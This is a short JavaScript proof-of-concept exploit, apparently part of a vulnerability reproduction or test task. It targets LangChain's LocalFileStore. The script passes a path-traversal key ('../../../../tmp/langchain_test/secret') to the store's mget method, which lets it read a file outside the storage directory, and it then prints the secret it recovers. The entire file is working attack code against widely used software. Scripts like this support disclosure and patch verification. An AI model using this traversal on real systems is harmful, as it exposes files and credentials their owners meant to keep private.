import { TextDecoder } from "util";
const { LocalFileStore } = await import("../../../codebase/langchain/dist/storage/file_system.js");

try {
  console.log("[*] Attempting to read secret file via path traversal...");

  const store = await LocalFileStore.fromPath("./messages");

  const read = await store.mget(["../../../../tmp/langchain_test/secret"]);

  if (!read[0]) {
    console.error("[-] No data returned â€” file may not exist or path is wrong.");
    process.exit(1);
  }

  const result = new TextDecoder().decode(read[0]);

  console.log("[+] Read content of secret.txt via path traversal:");
  console.log(result);
} catch (err) {
  console.error("[-] Exploit failed with error:");
  console.error(err);
  process.exit(1);
}
